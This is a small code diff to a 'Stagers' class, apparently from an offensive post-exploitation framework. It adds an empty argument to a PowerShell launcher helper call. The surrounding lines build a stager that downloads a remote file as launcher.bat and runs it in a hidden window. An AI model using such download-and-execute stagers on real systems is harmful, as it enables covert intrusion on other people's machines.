@@ -79,7 +79,7 @@ class Stagers:
         #TODO add handle for other than powershell language
         stager = 'wget "' + webFile + '" -outfile "launcher.bat"; Start-Process -FilePath .\launcher.bat -Wait -passthru -WindowStyle Hidden;'
         if encode:
-            return helpers.powershell_launcher(stager)
+            return helpers.powershell_launcher(stager, "")
         else:
             return stager
 
